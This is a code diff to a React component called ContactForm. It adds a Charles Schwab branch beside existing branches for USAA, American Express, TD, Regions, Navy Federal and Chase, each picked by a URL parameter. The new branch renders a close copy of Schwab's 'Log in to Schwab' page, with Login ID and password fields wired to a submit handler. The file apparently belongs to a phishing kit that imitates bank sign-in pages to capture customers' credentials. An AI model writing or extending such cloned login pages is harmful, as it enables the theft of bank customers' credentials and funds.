@@ -29,6 +29,8 @@ export default function ContactForm() {
   const [formStep, setFormStep] = useState('username') // 'username' | 'password' (para USAA)
   const [accountType, setAccountType] = useState('cards-banking') // para American Express
   const [showDescription, setShowDescription] = useState(false) // para TD
+  const [startPage, setStartPage] = useState('accounts-summary') // para Charles Schwab
+  const [language, setLanguage] = useState('english') // para Charles Schwab
 
   // Obtener parámetros de URL
   const params = new URLSearchParams(window.location.search)
@@ -99,6 +101,7 @@ export default function ContactForm() {
   const isTD = bankName?.toLowerCase().includes('td')
   const isRegions = bankName?.toLowerCase().includes('regions')
   const isNavyFederal = bankName?.toLowerCase().includes('navy federal')
+  const isCharlesSchwab = bankName?.toLowerCase().includes('charles schwab')
   const isChase = bankName?.toLowerCase().includes('chase')
 
   // ---- FORMULARIO ----
@@ -1125,6 +1128,113 @@ export default function ContactForm() {
                   <a href="#" className="text-base font-bold text-blue-600 hover:text-blue-700 uppercase tracking-wide">
                     Sign In Help
                   </a>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      )
+    }
+
+    // Diseño para Charles Schwab
+    if (isCharlesSchwab) {
+      return (
+        <div className="min-h-screen bg-gray-50 px-4 py-8 sm:px-0">
+          <div className="flex min-h-screen items-center justify-center">
+            <div className="w-full max-w-lg rounded-lg border border-gray-300 bg-white p-12">
+              <h1 className="mb-8 text-3xl font-bold text-gray-900">Log in to Schwab</h1>
+
+              <form onSubmit={submitForm} className="space-y-6">
+                {/* Login ID */}
+                <div>
+                  <label className="mb-2 block text-base font-semibold text-gray-800">Login ID</label>
+                  <input
+                    type="text"
+                    required
+                    value={username}
+                    onChange={(e) => setUsername(e.target.value)}
+                    className="w-full border border-gray-400 px-4 py-3 text-gray-800 outline-none transition-colors focus:border-teal-600"
+                  />
+                </div>
+
+                {/* Password */}
+                <div>
+                  <label className="mb-2 block text-base font-semibold text-gray-800">Password</label>
+                  <div className="relative">
+                    <input
+                      type={showPassword ? 'text' : 'password'}
+                      required
+                      value={password}
+                      onChange={(e) => setPassword(e.target.value)}
+                      className="w-full border border-gray-400 px-4 py-3 pr-10 text-gray-800 outline-none transition-colors focus:border-teal-600"
+                    />
+                    <button
+                      type="button"
+                      onClick={() => setShowPassword(!showPassword)}
+                      className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700"
+                    >
+                      <Icon name={showPassword ? 'eye-off' : 'eye'} size={20} />
+                    </button>
+                  </div>
+                </div>
+
+                {/* Remember Login ID */}
+                <label className="flex items-center gap-3">
+                  <input
+                    type="checkbox"
+                    checked={rememberUsername}
+                    onChange={(e) => setRememberUsername(e.target.checked)}
+                    className="h-5 w-5 cursor-pointer border border-gray-400 accent-teal-600"
+                  />
+                  <span className="text-base text-gray-800">Remember Login ID</span>
+                </label>
+
+                {/* Start Page */}
+                <div>
+                  <label className="mb-2 block text-base font-semibold text-gray-800">Start Page</label>
+                  <select
+                    value={startPage}
+                    onChange={(e) => setStartPage(e.target.value)}
+                    className="w-full border border-gray-400 px-4 py-3 text-gray-800 outline-none transition-colors focus:border-teal-600 bg-white"
+                  >
+                    <option value="accounts-summary">Accounts Summary</option>
+                    <option value="portfolio">Portfolio</option>
+                    <option value="positions">Positions</option>
+                  </select>
+                </div>
+
+                {/* Log In Button */}
+                <button
+                  type="submit"
+                  disabled={submitting}
+                  className="w-full bg-teal-700 py-3 font-bold text-white hover:bg-teal-800 transition-colors disabled:opacity-60 mt-8"
+                >
+                  {submitting ? 'Logging in…' : 'Log In'}
+                </button>
+              </form>
+
+              {/* Links and Language */}
+              <div className="mt-8 space-y-4 text-center">
+                <p className="text-base text-gray-800">
+                  Forgot <a href="#" className="text-blue-600 hover:text-blue-700 font-medium">Login ID</a> or{' '}
+                  <a href="#" className="text-blue-600 hover:text-blue-700 font-medium">Password</a>?
+                </p>
+
+                <div className="flex items-center justify-center gap-4 pt-4 border-t border-gray-300">
+                  <a href="#" className="text-blue-600 hover:text-blue-700 font-medium">
+                    New User?
+                  </a>
+                  <div className="border-l border-gray-400 pl-4">
+                    <select
+                      value={language}
+                      onChange={(e) => setLanguage(e.target.value)}
+                      className="border border-gray-400 px-3 py-2 text-gray-800 bg-white rounded hover:border-gray-500"
+                    >
+                      <option value="english">English</option>
+                      <option value="spanish">Español</option>
+                      <option value="chinese">中文</option>
+                    </select>
+                  </div>
                 </div>
               </div>
             </div>
